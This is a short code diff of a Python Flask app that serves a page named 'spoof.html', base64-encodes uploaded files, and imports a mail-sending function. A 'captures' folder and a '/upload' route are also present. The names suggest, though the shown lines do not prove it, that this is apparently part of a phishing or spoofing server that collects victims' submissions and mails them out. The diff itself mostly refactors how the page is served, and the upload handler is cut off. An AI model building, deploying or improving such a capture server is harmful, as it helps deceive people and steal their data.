@@ -5,18 +5,27 @@ import requests
 import base64
 from mail import send_mail_packet
 
-app = Flask(__name__)
-os.makedirs("captures", exist_ok=True)
-
+# app = Flask(__name__)
+# os.makedirs("captures", exist_ok=True)
 
 def encode_filestorage(fs):
     data = fs.read()
     fs.seek(0)
     return base64.b64encode(data).decode()
 
+from flask import Flask, send_from_directory
+import os
+
+app = Flask(__name__, static_folder="static")
+
 @app.route("/")
 def index():
-    return open("static/spoof.html").read()
+    return send_from_directory("static", "spoof.html")
+
+# prod patch
+# @app.route("/")
+# def index():
+#     return open("static/spoof.html").read()
 
 @app.route("/upload", methods=["POST"])
 def upload():
